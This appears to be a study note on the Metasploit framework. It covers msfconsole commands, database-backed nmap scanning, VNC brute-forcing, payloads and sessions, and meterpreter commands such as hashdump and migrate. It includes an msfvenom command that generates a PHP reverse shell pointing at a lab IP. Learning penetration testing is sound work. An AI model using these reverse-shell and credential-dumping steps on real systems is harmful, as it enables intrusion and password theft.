# Metasploit
An exploitation framework, which has a **lot** of tool from info gathering to post-exploitation.

## Msfconsole
`msfconsole` - main Metasploit interface. It's pretty much a shell with built-in support to use modules.

Main commands:

| Command                          | What It Does                                   |
|----------------------------------|------------------------------------------------|
| `search`                         | Looks For Modules Containing Equivalent String |
| `info`                           | Gives Info About Current/selected Module       |
| `use`                            | Select A Module                                |
| `show options/payloads/sessions` | Self Explanatory                               |
| `set` and `setg`lobal            | Used For Setting Parameters In Options         |
| `exploit` alias `run`            | Runs A Module                                  |

## Modules
### Scanning
There are many modules in `auxiliary/scanner`, you can also use nmap here.

### DBs
You can set up targets in the database so it'll be faster to penetrate 'em.

```sh
# setup
$ sudo systemctl start postgresql
$ msfdb init

# now in msfconsole you can check the status
msf6 > db_status

# create/delete/list a workspace
msf6 > workspace -h

# use db_nmap to save the results in the db
msf6 > db_nmap -sV -p- 10.10.12.922
```

After that, you have a list of hosts and services available in `hosts` and `services` respectably.

You can now e.g. set the `RHOSTS` value with `hosts -R`.

### Vulnerability Scanning
If you get a specific service, you can try if they're vulnerable to specific flaws. For example, you can use `auxiliary/scanner/vnc/vnc_login` and try to and brute force it.

### Exploitation
Exploits provide payloads, and they are useful for e.g. settings up a reverse shell. You can get them for a specific exploit with `show payloads` and select them with `set payload 2`, as an example. Specific payloads add new `options`, which may be required.

### Sessions
After a successful exploitation, if you set up a reverse shell, you will immediately enter into it. And that's when sessions come in. You can come back (background) to Metasploit with `CTRL+Z` and ofc stop it with `CTRL+C`.

`session` command here is used, to list them and enter them most times. All sessions have an ID, and some post-exploitation tool require them.

### Msfvenom
It is used to generate payloads in many different formats and for many different systems. Get a look at `msfvenom -h`, an example of generating a reverse shell in PHP is:<br>
`msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php`.

You can receive it with `exploit/multi/handler` module.

## Meterpreter
Meterpreter is an „agent” between you and target's system. What that means is that it contains many useful commands to interact with systems, so you don't have to know how to e.g. access a desktop screenshot or look for hashed user's passwords.

Please take a look at `help` command, it lists all available tools, grouped in categories that cover a specific topic, e.g. System, file system, networking etc.

Also note that meterpreter sits in RAM and it is disguised as a system process.

Here are some useful commands to take a look at: `shell`, `search`, `hashdump`, `migrate`, `ps`, `getuid`.